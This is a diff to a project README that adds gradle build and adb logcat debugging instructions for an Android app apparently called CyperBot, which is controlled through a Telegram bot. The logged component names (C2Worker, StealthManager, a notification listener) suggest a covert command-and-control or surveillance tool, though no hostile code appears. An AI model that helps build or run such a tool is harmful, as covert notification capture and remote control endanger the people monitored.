@@ -76,11 +76,30 @@ Control the agent via Telegram Bot:
 
 1.  **Prerequisites**: JDK 21, Android SDK API 34.
 2.  **Secrets**: Add `TELEGRAM_BOT_TOKEN` in `local.properties`.
-3.  **Command**: `./gradlew assembleRelease`
+3.  **Command**: `./gradlew assembleRelease` (Linux/macOS) or `gradlew assembleRelease` (Windows)
 
 ---
 
-## 🔧 Android SDK Verification & Setup
+## � Debugging & Analysis
+
+### Gradle Commands
+*   **Lint Analysis**: `./gradlew lint` (Full code analysis)
+*   **Build All**: `./gradlew assemble` (Builds both Debug & Release)
+
+### Logcat Filtering
+Filter logs to see only CyperBot's core components:
+```bash
+adb logcat -s "SentinelNotificationListener" "C2Worker" "StealthManager" "MainActivity"
+```
+
+Or filter by running process (Linux/Mac/Git Bash):
+```bash
+adb logcat | grep "com.zero.sentinel"
+```
+
+---
+
+## �🔧 Android SDK Verification & Setup
 
 ### 1. Download Required Tools
 Visit the [Android Command Line Tools download page](https://developer.android.com/studio#command-tools) and download the "Command line tools only" package for your operating system:
